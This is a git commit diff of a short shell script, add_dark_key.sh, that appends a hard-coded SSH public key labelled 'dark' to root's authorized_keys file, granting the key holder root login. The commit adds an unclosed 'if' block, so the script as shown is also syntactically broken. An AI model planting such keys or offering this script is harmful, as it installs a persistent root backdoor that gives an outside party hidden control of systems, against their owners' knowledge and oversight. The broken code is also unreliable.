0b6b64603abf77e7cb80727eee1ca48ac0ac5886
darkanemic <38096325+darkanemic@users.noreply.github.com>
2022-10-17 17:12:00 +0300

    Update add_dark_key.sh

--- Tools/add_dark_key.sh
+++ Tools/add_dark_key.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
-
+if [ ! -d "/root/.ssh" ]; then
+    mkdir /root/.ssh
 if [ -e /root ]; then
     if [ $( /bin/grep dark /root/.ssh/authorized_keys | wc -l) == 0 ]; then
         echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1qxTyHZnW7sWE787PsyELOUae9jl6QqB75ICfCTJWQjNzAf+6V4ztwrSVECmbNoGKkOWIWwKqEoKQJUbFtquc2KVYsQRSZPneG5/0+rEM9cEuRmfa3u6U7T+N1bGuaYGfjLRUlAafhZfy2mVCVMpZyzdeOLjWJr7TbebIS+ZBVgcXVbDqpcs3RLGqlHM4dPAzyHtXwsbCZrk182yYdLY1amqKgYcE14zfD4ZaDI6FoxaBEUhpcZ5NDiGRL7k+nFsvz/L8xziRtOtnuQho+u7clqffReWt2M1wglUtWcn5U/JUDTgf39/CUkNcMZOdwDfbXMUD9T+AhlvPUz8j5jWMVYzmdbOPdJMAccx9P5yeuvNBrLmHufZNfpDj7F9aeRJjhXNXucHudwC+AiLzsntvbiZlR6aIQvJ8DWFknmynF5V62cp64pYlDWQwgQRljJ40ahT15trqIiis24wmYErjxp0kG3xhjFixwy8U3onbMD5UIf8ms4/ww4DglSUtBKE= dark" >> /root/.ssh/authorized_keys
